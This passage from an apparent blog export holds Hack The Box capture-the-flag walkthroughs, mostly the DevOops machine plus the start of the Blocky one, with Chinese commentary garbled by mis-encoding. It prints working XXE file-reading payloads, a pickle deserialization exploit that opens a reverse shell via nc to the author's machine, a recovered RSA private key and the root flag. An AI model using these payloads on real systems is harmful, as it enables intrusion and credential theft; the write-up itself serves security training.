<p>5000 port run as Python web server <a href="https://gunicorn.org/">gunicorn</a>ï¼Œdirsearch and wfuzz scan directory</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;dirsearch -u http:&#x2F;&#x2F;10.10.10.91:5000&#x2F; -e *</span><br><span class="line">Target: http:&#x2F;&#x2F;10.10.10.91:5000&#x2F;</span><br><span class="line"></span><br><span class="line">[02:21:18] Starting: </span><br><span class="line">[02:24:47] 200 -  533KB - &#x2F;feed</span><br><span class="line">[02:27:26] 200 -  347B  - &#x2F;upload</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ wfuzz --hc&#x3D;404 -z file,&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt http:&#x2F;&#x2F;10.10.10.91:5000&#x2F;FUZZ</span><br><span class="line">...</span><br><span class="line">000000126:   200        1815 L   24122    517022 Ch   &quot;feed&quot;</span><br><span class="line">000000366:   200        0 L      39 W     347 Ch      &quot;upload&quot;</span><br><span class="line">000019602:   405        4 L      23 W     178 Ch      &quot;newpost&quot;</span><br></pre></td></tr></table></figure>
<h3 id="Getting-User-Flag">Getting User Flag</h3>
<p>visit the homepage</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    Under construction!<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">      This is feed.py, which will become the MVP for Blogfeeder application.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">      TODO: replace this with the proper feed from the dev.solita.fi backend.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/feed&quot;</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">width</span>=<span class="string">&quot;60%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;60%&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>visit <code>http://10.10.10.91:5000/upload</code>, it should upload xml file including Author, Subject, Content elements. Try to upload a normal xml file.</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Author</span>&gt;</span>author<span class="tag">&lt;/<span class="name">Author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Subject</span>&gt;</span>subject<span class="tag">&lt;/<span class="name">Subject</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Content</span>&gt;</span>content<span class="tag">&lt;/<span class="name">Content</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>return a comfirmation and file path.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PROCESSED BLOGPOST: Author: author Subject: subject Content: content URL for later reference: &#x2F;uploads&#x2F;test.xml File path: &#x2F;home&#x2F;roosa&#x2F;deploy&#x2F;src</span><br></pre></td></tr></table></figure>
<p>now, I try to upload an evil xml file that can read files</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Author</span> [<span class="meta">&lt;!ENTITY  <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Author</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Subject</span>&gt;</span>ca01h<span class="tag">&lt;/<span class="name">Subject</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Content</span>&gt;</span>njupt<span class="tag">&lt;/<span class="name">Content</span>&gt;</span></span><br><span class="line">	<span class="symbol">&amp;file;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Author</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Visit <code>http://10.10.10.91:5000/uploads/evil.xml</code>, success to return <code>/etc/passwd</code> file.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PROCESSED BLOGPOST: Author: njupt root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">......</span><br><span class="line">roosa:x:1002:1002:,,,:&#x2F;home&#x2F;roosa:&#x2F;bin&#x2F;bash sshd:x:121:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin blogfeed:x:1003:1003:,,,:&#x2F;home&#x2F;blogfeed:&#x2F;bin&#x2F;false Subject: ca01h Content: njupt URL for later reference: &#x2F;uploads&#x2F;evil.xml File path: &#x2F;home&#x2F;roosa&#x2F;deploy&#x2F;src</span><br></pre></td></tr></table></figure>
<p>ç»“åˆé¦–é¡µçš„<code>feed.py</code>æç¤ºï¼Œä»¥åŠä¸Šä¼ æˆåŠŸåçš„ä¿¡æ¯<code>/home/roosa/deploy/src</code>ï¼ŒçŒœæµ‹ç½‘ç«™çš„æºç åº”è¯¥æ˜¯æ”¾åœ¨è¿™ä¸ªç›®å½•ï¼Œç„¶åæˆ‘ä»¬å°è¯•è®¿é—®<code>/home/roosa/deploy/src/feed.py</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def uploaded_file(filename):</span><br><span class="line">	return send_from_directory(Config.UPLOAD_FOLDER, filename) </span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;&quot;) </span><br><span class="line">def xss(): </span><br><span class="line">	return template(&#39;index.html&#39;) </span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;feed&quot;) </span><br><span class="line">def fakefeed(): </span><br><span class="line">	return send_from_directory(&quot;.&quot;,&quot;devsolita-snapshot.png&quot;) </span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;newpost&quot;, methods&#x3D;[&quot;POST&quot;]) </span><br><span class="line">def newpost():</span><br><span class="line">	# TODO: proper save to database, this is for testing purposes right now </span><br><span class="line">	picklestr &#x3D; base64.urlsafe_b64decode(request.data) </span><br><span class="line">	# return picklestr</span><br><span class="line">	postObj &#x3D; pickle.loads(picklestr) </span><br><span class="line">	return &quot;POST RECEIVED: &quot; + postObj[&#39;Subject&#39;] </span><br><span class="line"></span><br><span class="line">## TODO: VERY important! DISABLED THIS IN PRODUCTION </span><br><span class="line">#app &#x3D; DebuggedApplication(app, evalex&#x3D;True, console_path&#x3D;&#39;&#x2F;debugconsole&#39;) </span><br><span class="line"># TODO: Replace run-gunicorn.sh with real Linux service script </span><br><span class="line">#app &#x3D; DebuggedApplication(app, evalex&#x3D;True, console_path&#x3D;&#39;&#x2F;debugconsole&#39;) </span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;: </span><br><span class="line">	app.run(host&#x3D;&#39;0.0.0,0&#39;, Debug&#x3D;True)</span><br></pre></td></tr></table></figure>
<p>æœ‰äº†å‰é¢Pythonååºåˆ—åŒ–çš„åŸºç¡€ï¼Œå°±å¾ˆå®¹æ˜“çœ‹å‡ºæ¥<code>postObj = pickle.loads(picklestr) </code>è¿™æ¡è¯­å¥å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚å†™ä¸€ä¸ªPythonè„šæœ¬åå¼¹shellï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://10.10.10.91:5000/newpost&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>&#125;</span><br><span class="line">code = <span class="string">&#x27;rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.99 9000 &gt;/tmp/x&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Devoops</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (code,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = base64.urlsafe_b64encode(pickle.dumps(Devoops()))</span><br><span class="line">print(payload)</span><br><span class="line">r = requests.post(url=url, data=payload, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ä¸€å®šè¦ç”¨Python2æ‰§è¡Œè„šæœ¬ï¼Œå› ä¸ºpy2å’Œpy3åºåˆ—åŒ–åçš„ç»“æœæ˜¯å®Œå…¨ä¸ä¸€æ ·çš„</p>
</blockquote>
<p>æœ¬æœºç›‘å¬ç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc -lvvp 9000 </span><br><span class="line">listening on [any] 9000 ...</span><br><span class="line">10.10.10.91: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.16.99] from (UNKNOWN) [10.10.10.91] 44014</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ id</span><br><span class="line">uid&#x3D;1002(roosa) gid&#x3D;1002(roosa) groups&#x3D;1002(roosa),4(adm),27(sudo)</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">roosa@gitter:~&#x2F;deploy&#x2F;src$ id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;1002(roosa) gid&#x3D;1002(roosa) groups&#x3D;1002(roosa),4(adm),27(sudo)</span><br><span class="line">roosa@gitter:~&#x2F;deploy&#x2F;src$ cd &amp;&amp; ls -a user.txt</span><br><span class="line">cd &amp;&amp; ls -a user.txt</span><br><span class="line">user.txt</span><br></pre></td></tr></table></figure>
<p>è¿˜æœ‰ä¸€ç§æ›´ç®€å•çš„æ–¹æ³•ã€‚å¯¹äºç›®æ ‡é¶æœºåªæœ‰åªè¯»çš„è®¿é—®æƒé™ï¼Œ<a href="https://digi.ninja/blog/when_all_you_can_do_is_read.php">è¿™ç¯‡æ–‡ç« </a>æç¤ºäº†æˆ‘ä»¬åº”æŸ¥æ‰¾çš„æ–‡ä»¶ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®roosaä¸»ç›®å½•çš„id_rsaæ–‡ä»¶ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Author [&lt;!ENTITY  file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;home&#x2F;roosa&#x2F;.ssh&#x2F;id_rsa&quot;&gt;]&gt;</span><br><span class="line">&lt;Author&gt;</span><br><span class="line">	&lt;Subject&gt;ca01h&lt;&#x2F;Subject&gt;</span><br><span class="line">	&lt;Content&gt;njupt&lt;&#x2F;Content&gt;</span><br><span class="line">	&amp;file;</span><br><span class="line">&lt;&#x2F;Author&gt;</span><br></pre></td></tr></table></figure>
<p>è·å–åä¿å­˜åˆ°æœ¬æœºï¼Œç”¨sshç™»å½•é¶æœºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;DevOops [2:01:04] </span><br><span class="line">$ chmod 600 id_rsa </span><br><span class="line"></span><br><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;DevOops [2:01:19] </span><br><span class="line">$ ssh -i id_rsa roosa@10.10.10.91</span><br><span class="line">The authenticity of host &#39;10.10.10.91 (10.10.10.91)&#39; can&#39;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:hbD2D4PdnIVpAFHV8sSAbtM0IlTAIpYZ&#x2F;nwspIdp4Vg.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#39;10.10.10.91&#39; (ECDSA) to the list of known hosts.</span><br><span class="line">Welcome to Ubuntu 16.04.4 LTS (GNU&#x2F;Linux 4.13.0-37-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">135 packages can be updated.</span><br><span class="line">60 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">roosa@gitter:~$ id</span><br><span class="line">uid&#x3D;1002(roosa) gid&#x3D;1002(roosa) groups&#x3D;1002(roosa),4(adm),27(sudo)</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Flag">Getting Root Flag</h3>
<p>æˆåŠŸç™»å½•ä¹‹åï¼Œçœ‹ä¸€ä¸‹<code>.bash_history</code>ï¼Œæœ‰å‡ ä¸ªå…³é”®çš„gitå‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">mkdir integration&#x2F;auth_credentials.key</span><br><span class="line">nano integration&#x2F;auth_credentials.key&#x2F;</span><br><span class="line">ls -altr</span><br><span class="line">chmod go-rwx authcredentials.key</span><br><span class="line">...</span><br><span class="line">rm -Rf resources&#x2F;integration&#x2F;auth_credentials.key</span><br><span class="line">mv resources&#x2F;authcredentials.key resources&#x2F;integration&#x2F;</span><br><span class="line">git add resources&#x2F;integration&#x2F;authcredentials.key </span><br><span class="line">git commit -m &#39;add key for feed integration from tnerprise backend&#39;</span><br><span class="line">...</span><br><span class="line">ssh-keygen</span><br><span class="line">...</span><br><span class="line">cat kak</span><br><span class="line">cp kak resources&#x2F;integration&#x2F;authcredentials.key </span><br><span class="line">git add resources&#x2F;integration&#x2F;authcredentials.key </span><br><span class="line">git commit -m &#39;reverted accidental commit with proper key&#39;</span><br></pre></td></tr></table></figure>
<p>å»gitæœ¬åœ°ä»“åº“çœ‹ä¸€ä¸‹æäº¤å†å²</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">roosa@gitter:~&#x2F;work&#x2F;blogfeed$ git log --pretty&#x3D;oneline</span><br><span class="line">7ff507d029021b0915235ff91e6a74ba33009c6d Use Base64 for pickle feed loading</span><br><span class="line">26ae6c8668995b2f09bf9e2809c36b156207bfa8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.</span><br><span class="line">cec54d8cb6117fd7f164db142f0348a74d3e9a70 Debug support added to make development more agile.</span><br><span class="line">ca3e768f2434511e75bd5137593895bd38e1b1c2 Blogfeed app, initial version.</span><br><span class="line">dfebfdfd9146c98432d19e3f7d83cc5f3adbfe94 Gunicorn startup script</span><br><span class="line">33e87c312c08735a02fa9c796021a4a3023129ad reverted accidental commit with proper key</span><br><span class="line">d387abf63e05c9628a59195cec9311751bdb283f add key for feed integration from tnerprise backend</span><br><span class="line">1422e5a04d1b52a44e6dc81023420347e257ee5f Initial commit</span><br></pre></td></tr></table></figure>
<p>å›é€€åˆ°ç¬¬äºŒä¸ªcommitç‰ˆæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">roosa@gitter:~&#x2F;work&#x2F;blogfeed&#x2F;resources&#x2F;integration$ git reset --hard d387abf63e05c9628a59195cec9311751bdb283f</span><br><span class="line">HEAD is now at d387abf add key for feed integration from tnerprise backend</span><br><span class="line">roosa@gitter:~&#x2F;work&#x2F;blogfeed&#x2F;resources&#x2F;integration$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxrwxr-x 2 roosa roosa 4096 Mar 30 02:42 .</span><br><span class="line">drwxrwxr-x 3 roosa roosa 4096 Mar 30 02:39 ..</span><br><span class="line">-rw-rw-r-- 1 roosa roosa 1676 Mar 30 02:42 authcredentials.key</span><br><span class="line">roosa@gitter:~&#x2F;work&#x2F;blogfeed&#x2F;resources&#x2F;integration$ cat authcredentials.key </span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU&#x2F;WFI+OPQcpOVj9DdSIEde</span><br><span class="line">8PDgpt&#x2F;tBpY7a&#x2F;xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo&#x2F;hfaUUyU5i</span><br><span class="line">vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH&#x2F;NwYW2iovTRK</span><br><span class="line">nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt&#x2F;rEgIVmrb+</span><br><span class="line">CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc&#x2F;SHSE0c</span><br><span class="line">F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH</span><br><span class="line">uzjPbIdyEkDc3PAYP+E&#x2F;jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL</span><br><span class="line">gCfN5I+xZGH19V4HPMCrK6PzskYII3&#x2F;i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD</span><br><span class="line">k2X0256DbRv&#x2F;ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy</span><br><span class="line">NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM</span><br><span class="line">HSRik2J&#x2F;7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa</span><br><span class="line">2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK&#x2F;oLc0RB</span><br><span class="line">GLEKU6HtUuKFvlXdJ22S4&#x2F;rQb0RiDcU&#x2F;wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG</span><br><span class="line">jwrjv&#x2F;loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41</span><br><span class="line">IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw</span><br><span class="line">+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp&#x2F;QYtjn&#x2F;ltojR16JNTKqiW</span><br><span class="line">7vSqlsZnT9jR2syvuhhVz4Ei9yA&#x2F;VYZG2uiCpK0CgYA&#x2F;UOhz+LYu&#x2F;MsGoh0+yNXj</span><br><span class="line">Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS</span><br><span class="line">iD6fE+5&#x2F;i&#x2F;rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo&#x2F;PcFlfXQhrERxRXJQKPHdJP7</span><br><span class="line">VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp&#x2F;INRX</span><br><span class="line">S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6</span><br><span class="line">md&#x2F;EqUtm84&#x2F;VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie</span><br><span class="line">LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz</span><br><span class="line">oAvexd1JRMkbC7YOgrzZ9iOxHP+mg&#x2F;LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw</span><br><span class="line">LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE&#x3D;</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>æ‹·è´åˆ°æœ¬æœºä¿å­˜ï¼Œå†ç”¨sshç™»å½•é¶æœº</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ chmod 600 root_id_rsa </span><br><span class="line"></span><br><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;DevOops [2:44:48] </span><br><span class="line">$ ssh -i root_id_rsa root@10.10.10.91</span><br><span class="line">Welcome to Ubuntu 16.04.4 LTS (GNU&#x2F;Linux 4.13.0-37-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">135 packages can be updated.</span><br><span class="line">60 updates are security updates.</span><br><span class="line"></span><br><span class="line">Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1</span><br><span class="line">root@gitter:~# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@gitter:~# cat root.txt </span><br><span class="line">d4fe1e7f7187407eebdd3209cb1ac7b3</span><br></pre></td></tr></table></figure>
<h2 id="0x05-Reference">0x05 Reference</h2>
<p><a href="https://epi052.gitlab.io/notes-to-self/blog/2018-10-11-hack-the-box-devoops/">https://epi052.gitlab.io/notes-to-self/blog/2018-10-11-hack-the-box-devoops/</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Blocky Walkthrough</title>
    <url>/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Blocky-Walkthrough">HTB::Blocky Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407105817.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>dirsearch</li>
<li>wpscan</li>
<li>jad</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<p>nmap scan</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-14 10:54 CET</span><br><span class="line">  Nmap scan report for 10.10.10.37</span><br><span class="line">  Host is up (0.085s latency).</span><br><span class="line">  Not shown: 996 filtered ports</span><br><span class="line">  PORT     STATE  SERVICE VERSION</span><br><span class="line">  21&#x2F;tcp   open   ftp     ProFTPD 1.3.5a</span><br><span class="line">  22&#x2F;tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">  | ssh-hostkey:</span><br><span class="line">  |   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)</span><br><span class="line">  |   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)</span><br><span class="line">  |_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)</span><br><span class="line">  80&#x2F;tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">  |_http-generator: WordPress 4.8</span><br><span class="line">  |_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">  |_http-title: BlockyCraft â€“ Under Construction!</span><br><span class="line">  8192&#x2F;tcp closed sophos</span><br><span class="line">  Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">  Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">  Nmap done: 1 IP address (1 host up) scanned in 19.32 seconds</span><br></pre></td></tr></table></figure>
<p>dirsearch scan</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;dirsearch.py -u 10.10.10.37 -e * </span><br><span class="line">[08:44:06] 301 -    0B  - &#x2F;index.php  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;                                            </span><br><span class="line">[08:44:09] 301 -  315B  - &#x2F;javascript  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;javascript&#x2F;</span><br><span class="line">[08:44:13] 200 -   19KB - &#x2F;license.txt               </span><br><span class="line">[08:44:37] 301 -  315B  - &#x2F;phpmyadmin  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;phpmyadmin&#x2F;</span><br><span class="line">[08:44:41] 200 -   10KB - &#x2F;phpmyadmin&#x2F;               </span><br><span class="line">[08:44:42] 301 -  312B  - &#x2F;plugins  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;plugins&#x2F;</span><br><span class="line">[08:44:46] 200 -    7KB - &#x2F;readme.html               </span><br><span class="line">[08:44:52] 403 -  299B  - &#x2F;server-status             </span><br><span class="line">[08:44:52] 403 -  300B  - &#x2F;server-status&#x2F;</span><br><span class="line">[08:45:21] 200 -  380B  - &#x2F;wiki&#x2F;</span><br><span class="line">[08:45:21] 301 -  313B  - &#x2F;wp-admin  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-admin&#x2F;</span><br><span class="line">[08:45:21] 301 -  309B  - &#x2F;wiki  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;wiki&#x2F;</span><br><span class="line">[08:45:21] 302 -    0B  - &#x2F;wp-admin&#x2F;  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-login.php?redirect_to&#x3D;http%3A%2F%2F10.10.10.37%2Fwp-admin%2F&amp;reauth&#x3D;1</span><br><span class="line">[08:45:22] 200 -    1KB - &#x2F;wp-admin&#x2F;install.php</span><br><span class="line">[08:45:22] 500 -    4KB - &#x2F;wp-admin&#x2F;setup-config.php</span><br><span class="line">[08:45:22] 200 -    0B  - &#x2F;wp-content&#x2F;</span><br><span class="line">[08:45:22] 301 -  315B  - &#x2F;wp-content  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-content&#x2F;</span><br><span class="line">[08:45:23] 200 -   69B  - &#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;akismet.php</span><br><span class="line">[08:45:23] 200 -  965B  - &#x2F;wp-content&#x2F;uploads&#x2F;</span><br><span class="line">[08:45:23] 301 -  316B  - &#x2F;wp-includes  -&gt;  http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-includes&#x2F;</span><br><span class="line">[08:45:23] 500 -    0B  - &#x2F;wp-includes&#x2F;rss-functions.php</span><br><span class="line">[08:45:23] 200 -    2KB - &#x2F;wp-login.php</span><br><span class="line">[08:45:23] 200 -   40KB - &#x2F;wp-includes&#x2F;</span><br><span class="line">[08:45:24] 405 -   42B  - &#x2F;xmlrpc.php                </span><br><span class="line"> </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
<p>wpscan</p>
